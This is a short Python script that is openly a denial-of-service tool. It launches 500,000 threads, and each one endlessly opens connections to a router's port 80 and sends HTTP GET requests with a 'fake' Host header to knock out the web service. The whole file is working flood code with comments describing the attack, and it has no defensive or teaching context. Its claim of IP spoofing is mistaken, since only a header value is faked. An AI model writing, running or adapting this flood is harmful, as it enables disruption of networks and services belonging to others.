import threading
import socket

# need to know the inside ip of my router, default gateway
target_ip = '172.31.4.1'
# we can choose which service to put down,
# port number 80 puts down the http service
port = 80

fake_ip = '192.168.1.132'

# for counting the number of connections made
already_connected = 0


def attack():
    # This is a never ending loop
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, port))
        s.sendto(("GET /" + target_ip + "HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, port))
        s.close()

        # For checking the number of connections
        global already_connected
        already_connected += 1
        print(already_connected)

        if (already_connected == 500000):
            print(already_connected)


# Running the attack in multiple threads
for i in range(500000):
    # Specifying the attack function as the target function
    thread = threading.Thread(target=attack)
    thread.start()
